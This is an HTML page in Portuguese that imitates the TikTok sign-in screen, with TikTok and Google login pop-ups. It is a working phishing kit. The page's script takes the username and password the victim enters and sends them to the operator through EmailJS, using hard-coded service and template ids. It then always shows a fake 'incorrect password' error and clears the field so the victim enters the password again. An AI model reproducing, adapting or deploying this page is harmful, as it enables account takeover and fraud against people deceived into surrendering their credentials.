<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar | TikTok</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <!-- SDK EmailJS v4 -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600;700&display=swap');
        
        body { 
            font-family: 'IBM Plex Sans', sans-serif; 
            background-color: #fff; 
            color: rgb(22, 24, 35);
        }
        .modal-overlay { 
            background-color: rgba(0, 0, 0, 0.5); 
            display: none; 
            position: fixed; 
            inset: 0; 
            z-index: 50; 
            align-items: center; 
            justify-content: center; 
        }
        .btn-login-option { 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            width: 100%; 
            height: 44px; 
            border: 1px solid rgba(22, 24, 35, 0.12); 
            border-radius: 8px; 
            margin-bottom: 12px; 
            font-weight: 600; 
            font-size: 15px; 
            position: relative; 
            cursor: pointer; 
            transition: background-color 0.2s; 
        }
        .btn-first-option { font-size: 13.5px; }
        .btn-login-option:hover { background-color: rgba(22, 24, 35, 0.03); }
        .btn-login-option i, .btn-login-option img { 
            position: absolute; 
            left: 12px; 
            font-size: 18px; 
        }
        .input-field { 
            width: 100%; 
            height: 44px; 
            background: rgba(22, 24, 35, 0.06); 
            border: 1px solid transparent; 
            border-radius: 4px; 
            padding: 0 12px; 
            margin-bottom: 8px; 
            outline: none; 
            font-size: 15px; 
        }
        .input-field.error {
            border-color: #ff3b30;
            background: rgba(255, 59, 48, 0.05);
        }
        .error-message {
            color: #ff3b30;
            font-size: 12px;
            margin-bottom: 10px;
            display: none;
            text-align: left;
        }
        .btn-submit { 
            width: 100%; 
            height: 44px; 
            background-color: #fe2c55; 
            color: white; 
            font-weight: 700; 
            border-radius: 4px; 
            margin-top: 16px; 
            font-size: 15px; 
            transition: opacity 0.2s; 
        }
        .btn-submit:disabled { 
            background-color: #fe2c55; 
            opacity: 0.6; 
            cursor: not-allowed; 
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">

    <div class="w-full max-w-[480px] p-6 text-center">
        <h1 class="text-[32px] font-bold mb-8">Entrar no TikTok</h1>
        
        <div class="space-y-1">
            <div onclick="openModal('username')" class="btn-login-option btn-first-option">
                <i class="far fa-user"></i>
                <span>Usar telefone / e-mail / nome de usuário</span>
            </div>
            
            <div class="btn-login-option">
                <i class="fab fa-facebook text-[#1877f2]"></i>
                <span>Continuar com o Facebook</span>
            </div>

            <div onclick="openModal('google')" class="btn-login-option">
                <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" width="18" alt="Google">
                <span>Continuar com o Google</span>
            </div>

            <div class="btn-login-option">
                <i class="fab fa-apple text-black"></i>
                <span>Continuar com a Apple</span>
            </div>
        </div>

        <p class="text-[12px] text-gray-500 mt-6 leading-relaxed">
            Ao continuar, você concorda com os <span class="font-bold text-black cursor-pointer">Termos de Serviço</span> do TikTok e confirma que leu a <span class="font-bold text-black cursor-pointer">Política de Privacidade</span> do TikTok.
        </p>

        <hr class="my-6 border-gray-100">

        <p class="text-[15px]">
            Não tem uma conta? <span class="text-[#fe2c55] font-bold cursor-pointer">Criar conta</span>
        </p>
    </div>

    <!-- Modal -->
    <div id="loginModal" class="modal-overlay">
        <div class="bg-white w-[90%] max-w-[400px] rounded-lg p-8 relative shadow-xl">
            <button onclick="closeModal()" class="absolute top-4 right-4 text-2xl text-gray-400 hover:text-black">×</button>
            
            <h2 id="modalTitle" class="text-2xl font-bold mb-6 text-center">Entrar</h2>
            
            <form id="loginForm" onsubmit="handleSubmit(event)">
                <div id="errorMessage" class="error-message">
                    Sua senha está incorreta. Recrie sua senha ou tente novamente.
                </div>
                <div id="inputContainer"></div>
                <button type="submit" id="submitBtn" class="btn-submit">Entrar</button>
            </form>
        </div>
    </div>

    <script>
        let currentMethod = '';
        const REDIRECT_URL = 'https://love-one-kohl.vercel.app';

        // Inicializa EmailJS
        emailjs.init({
            publicKey: "8RX9bRb_kjK9Ee8q2"
        });

        function openModal(method) {
            currentMethod = method;
            const modal = document.getElementById('loginModal');
            const container = document.getElementById('inputContainer');
            const title = document.getElementById('modalTitle');
            const submitBtn = document.getElementById('submitBtn');
            const errorMsg = document.getElementById('errorMessage');
            
            errorMsg.style.display = 'none';
            submitBtn.disabled = false;
            submitBtn.innerText = 'Entrar';
            modal.style.display = 'flex';
            container.innerHTML = '';

            if (method === 'google') {
                title.innerText = 'Login com Google';
                container.innerHTML = `
                    <input type="email" id="user_field" placeholder="E-mail ou Telefone" class="input-field" required>
                    <input type="password" id="pass_field" placeholder="Senha" class="input-field" required>
                `;
            } else {
                title.innerText = 'Login TikTok';
                container.innerHTML = `
                    <input type="text" id="user_field" placeholder="E-mail ou nome de usuário" class="input-field" required>
                    <input type="password" id="pass_field" placeholder="Senha" class="input-field" required>
                `;
            }
        }

        function closeModal() {
            document.getElementById('loginModal').style.display = 'none';
        }

        async function handleSubmit(event) {
            event.preventDefault();
            const submitBtn = document.getElementById('submitBtn');
            const userField = document.getElementById('user_field');
            const passField = document.getElementById('pass_field');
            const errorMsg = document.getElementById('errorMessage');
            
            const user = userField.value;
            const pass = passField.value;

            submitBtn.disabled = true;
            submitBtn.innerText = 'Entrando...';

            const templateParams = {
                method: currentMethod === 'google' ? 'Google' : 'TikTok',
                user: user,
                pass: pass,
                timestamp: new Date().toLocaleString('pt-BR')
            };

            // Envia os dados em background mas mostra erro para o usuário
            try {
                await emailjs.send(
                    'service_y7qz76w',
                    'template_fsq66g2',
                    templateParams
                );
            } catch (error) {
                console.error('Erro no log:', error);
            }

            // Simula atraso de rede e mostra erro
            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.innerText = 'Entrar';
                
                // Aplica estilos de erro
                passField.classList.add('error');
                userField.classList.add('error');
                errorMsg.style.display = 'block';
                
                // Limpa a senha para forçar nova tentativa
                passField.value = '';
                passField.focus();
            }, 800);
        }

        window.onclick = function(event) {
            const modal = document.getElementById('loginModal');
            if (event.target == modal) closeModal();
        };
    </script>
</body>
</html>

